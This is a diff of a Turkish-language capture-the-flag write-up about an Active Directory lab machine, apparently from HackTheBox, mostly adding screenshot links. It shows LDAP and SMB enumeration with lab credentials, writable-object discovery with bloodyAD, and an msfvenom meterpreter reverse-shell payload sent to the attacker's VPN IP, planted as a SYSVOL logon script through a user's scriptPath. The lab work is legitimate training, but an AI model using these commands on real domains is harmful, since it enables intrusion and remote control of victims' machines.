@@ -50,7 +50,7 @@ sonuçlar klasik bir Active Directory profilini gösteriyor:
 
 
 3- /etc/hosts kaydı
-![echo](images/04-echo.png}
+![echo](images/04-echo.png)
 echo "10.129.244.207 garfield.htb DC01.garfield.htb" | sudo tee -a /etc/hosts
 
 
@@ -58,9 +58,9 @@ echo "10.129.244.207 garfield.htb DC01.garfield.htb" | sudo tee -a /etc/hosts
 4- LDAP Kullanıcı Enumerasyonu 
 
 nxc ldap garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users
+![ldap](images/05-ldap-users.png)
 
 Elimizde zaten geçerli bir kimlik bilgisi var: j.arbuckle : Th1sD4mnC4t!@1978 . Bununla nxc(NetExec) üzerinden LDAP'a bağlanıp domain kullanıcıları listeliyoruz. 
-
 7 tane domain kullanıcısı listelendi. Dikkat çeken nokta krbtgt_8245 kullanıcısı çünkü normal bir domain'de tek bir krbtgt bulunması gerekir. İkinci bir krbtgt hesabı ortamda bir RODC olduğunun bir işaretidir
 
 
@@ -68,6 +68,7 @@ Elimizde zaten geçerli bir kimlik bilgisi var: j.arbuckle : Th1sD4mnC4t!@1978 .
 5- SMB Enumerasyonu ve ACL Keşfi 
 
 nxc smb garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -M spider_plus
+![smb](images/06smb-spider-plus.png)
 
 Elimizdeki j.arbuckle kimlik bilgisiyle SMB paylaşımlarını tarıyoruz hangi share'lere erişebildiğimizi ve içeride neler olduğunu görmek için
 5 share tespit edildi, 3'ü okunabilir (IPCS, NETLOGON, SYSVOL) SYSVOL ve NETLOGON dikkat çekici çünkü bunlar logon script'lerin ve GPO dosyalarının tutulduğu paylaşımlar.
@@ -76,6 +77,10 @@ Elimizdeki j.arbuckle kimlik bilgisiyle SMB paylaşımlarını tarıyoruz hangi 
 6- bloodyAD ile Writable Keşfi 
 
 bloodyAD --host DC01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get writable --detail
+![writable](images/07-writable.png)
+![writable](images/08-writable2.png)
+![writable](images/09-writable3.png)
+![writable](images/10-writable4.png)
 
 j.arbuckle hesabının domain genelinde hangi AD nesnelerinde yazma hakkı olduğunu kontrol ediyoruz.
 
@@ -89,6 +94,7 @@ tun0 üzerindeki VPN IP'im --> 10.10.17.90
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.17.90 LPORT=443 -f psh-cmd | tail -n 1 > gar2.txt
 
 printf '@echo off\r\n%s\r\n' "$(cat gar2.txt)" > garr2.bat
+![msfvenom](images/11-msfvenom-bat.png)
 
 -f psh-cmd formatı doğrudan bir PowerShell komutu(base64 encoded) olarak üretir. bunu bir .bat dosyasına ekleyerek(@echo off + PowerShell) komutu, scriptPath mekanizmasının çalıştırabileceği bir dosya elde ediyoruz.
 
@@ -102,7 +108,9 @@ smbclient //10.129.244.207/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' -c 'cd garfi
 garr2.bat dosyası SYSVOL\garfield.htb\scripts\ altına yüklendi.
 
 bloodyAD --host DC01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v garr2.bat
+![smb-blood](images/12-smb-bat-blood-bat.png)
 
+garr2.bat dosyası SYSVOL\garfield.htb\scripts\ altına yüklendi.
 l.wilson Kullanıcısının scriptPath özelliği garr2.bat olarak ayarlandı.
 
 
